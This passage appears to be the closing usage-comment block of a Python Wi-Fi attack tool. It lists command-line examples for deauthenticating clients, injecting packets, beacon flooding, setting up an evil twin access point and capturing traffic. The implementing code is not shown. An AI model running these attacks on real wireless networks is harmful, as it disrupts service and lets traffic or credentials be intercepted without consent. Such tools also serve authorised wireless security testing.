...
#    python wifi_attack_tool.py --deauth --target XX:XX:XX:XX:XX:XX --ap YY:YY:YY:YY:YY:YY --interface wlan0
# 2. Inject a custom packet:
#    python wifi_attack_tool.py --inject --packet "fake_packet.pcap" --interface wlan0
# 3. Discover devices on a network:
#    python wifi_attack_tool.py --discover --interface wlan0
# 4. Perform a beacon flood:
#    python wifi_attack_tool.py --beacon-flood --interface wlan0
# 5. Start channel hopping:
#    python wifi_attack_tool.py --channel-hop --interface wlan0
# 6. Capture packets:
#    python wifi_attack_tool.py --capture --interface wlan0 --output capture.pcap
# 7. Create an evil twin:
#    python wifi_attack_tool.py --evil-twin --ssid "FakeNet" --interface wlan0
# 8. Monitor RSSI:
#    python wifi_attack_tool.py --monitor-rssi --target XX:XX:XX:XX:XX:XX --interface wlan0
# 9. Log all actions:
#    python wifi_attack_tool.py --log
# -------------------------------------------
